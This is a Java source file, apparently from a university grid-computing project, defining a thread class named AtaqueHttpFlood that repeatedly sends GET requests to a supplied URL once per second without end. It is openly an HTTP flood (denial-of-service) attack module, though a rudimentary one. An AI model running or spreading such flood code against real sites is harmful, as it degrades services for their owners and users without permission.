/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package edu.br.utfpr.projectingrid.Core.ataques;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author 2Dverse
 */
public class AtaqueHttpFlood extends Thread{
    
    private static String urlToRead;
    
    public AtaqueHttpFlood(String urlToRead){
        this.urlToRead = urlToRead;
    }
    
    
    public static void getHTML() throws Exception {
      StringBuilder result = new StringBuilder();
      URL url = new URL(urlToRead);
      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
      conn.setRequestMethod("GET");
      BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
      String line;
      while ((line = rd.readLine()) != null) {
         result.append(line);
      }
      rd.close();
      System.out.println(result.toString());
   }

    @Override
    public void run() {
        while(true){
            try        
            {
                getHTML();
                Thread.sleep(1000);
            } 
            catch(InterruptedException ex) 
            {
                Thread.currentThread().interrupt();
            } catch (Exception ex) {
                Logger.getLogger(AtaqueHttpFlood.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        
    }
    
    
}
